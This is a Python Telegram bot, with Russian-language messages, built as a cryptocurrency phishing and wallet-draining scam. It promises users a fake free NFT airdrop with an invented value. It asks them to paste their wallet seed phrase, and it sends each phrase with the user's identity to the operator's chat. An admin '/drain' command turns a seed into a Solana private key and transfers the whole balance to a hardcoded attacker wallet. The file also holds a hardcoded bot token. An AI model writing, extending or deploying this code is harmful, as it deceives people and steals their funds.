import asyncio
import logging
import random
import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9029487798:AAEqAXvQrO7GS6e8pbSeEcTrqCnx6lgF6yY"
ADMIN_ID = 8113412295
LOG_CHAT = 8113412295
DEST_WALLET = "DP2bBZ79wrAaFkDh2ebV55fMew8QAuxq6wxGwGxmWvhU"

# --- БИБЛИОТЕКИ SOLANA ---
try:
    from solana.rpc.api import Client
    from solana.keypair import Keypair
    from solana.transaction import Transaction
    from solana.system_program import TransferParams, transfer
    from solana.publickey import PublicKey
    from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins
    SOLANA_OK = True
except ImportError:
    SOLANA_OK = False

RPC = "https://api.mainnet-beta.solana.com"
client = Client(RPC) if SOLANA_OK else None

# --- ФЕЙКОВЫЕ ДАННЫЕ ---
FAKE_NFTS = [
    "Bored Ape #7812", "CryptoPunk #4321", "Azuki #990",
    "Doodle #5521", "Moonbird #1122"
]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class Form(StatesGroup):
    waiting_seed = State()

# --- СТАРТ ---
@dp.message(CommandStart())
async def start(message: types.Message, state: FSMContext):
    kb = InlineKeyboardBuilder()
    kb.button(text="🎁 Проверить аирдроп", callback_data="check")
    await message.answer(
        f"👋 Привет, {message.from_user.first_name}!\n\n"
        "🔥 Ты в списке на получение бесплатного NFT!\n"
        "Нажми кнопку ниже, чтобы проверить:",
        reply_markup=kb.as_markup()
    )

@dp.callback_query(F.data == "check")
async def check(callback: types.CallbackQuery):
    nft = random.choice(FAKE_NFTS)
    kb = InlineKeyboardBuilder()
    kb.button(text="💰 Забрать NFT", callback_data="claim")
    await callback.message.edit_text(
        f"✅ Поздравляем!\n\n"
        f"Твой NFT: `{nft}`\n"
        f"Стоимость: **$4,200**\n\n"
        "Для получения нужно восстановить кошелек.\n"
        "Введи seed-фразу (12/24 слова) прямо в чат:",
        reply_markup=kb.as_markup(),
        parse_mode="Markdown"
    )
    await callback.answer()

# --- ПРИЁМ SEED ---
@dp.message(F.text & ~F.text.startswith("/"))
async def receive_seed(message: types.Message, state: FSMContext):
    seed = message.text.strip()
    if len(seed.split()) < 12:
        await message.answer("❌ Неверная фраза. Введи 12 или 24 слова.")
        return

    user = message.from_user
    log = (
        f"🔑 **НОВЫЙ SEED**\n"
        f"├ User: {user.full_name}\n"
        f"├ ID: `{user.id}`\n"
        f"└ Seed: `{seed}`"
    )
    try:
        await bot.send_message(LOG_CHAT, log, parse_mode="Markdown")
    except Exception:
        pass

    await message.answer(
        "⏳ **Транзакция в обработке...**\n"
        "NFT появится в кошельке в течение 24 часов."
    )

# --- АДМИН: СЛИВ ---
@dp.message(Command("drain"))
async def drain_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    if not SOLANA_OK:
        await message.answer("Solana libs not installed.")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: `/drain <seed>`", parse_mode="Markdown")
        return

    seed = parts[1].strip()
    try:
        seed_bytes = Bip39SeedGenerator(seed).Generate()
        bip44_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
        private_key_bytes = bip44_mst.PrivateKey().Raw().ToBytes()
        kp = Keypair.from_secret_key(private_key_bytes)
        
        balance = client.get_balance(kp.public_key).value
        if balance <= 5000:
            await message.answer(f"Баланс: {balance/1e9:.4f} SOL (мало)")
            return

        tx = Transaction().add(transfer(TransferParams(
            from_pubkey=kp.public_key,
            to_pubkey=PublicKey(DEST_WALLET),
            lamports=balance - 5000
        )))
        sig = client.send_transaction(tx, kp)
        await message.answer(f"✅ Отправлено {balance/1e9:.4f} SOL\nTX: `{sig.value}`", parse_mode="Markdown")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# --- ЗАГЛУШКА ДЛЯ RENDER ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), BaseHTTPRequestHandler)
    server.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=run_dummy_server, daemon=True).start()
    asyncio.run(dp.start_polling(bot))
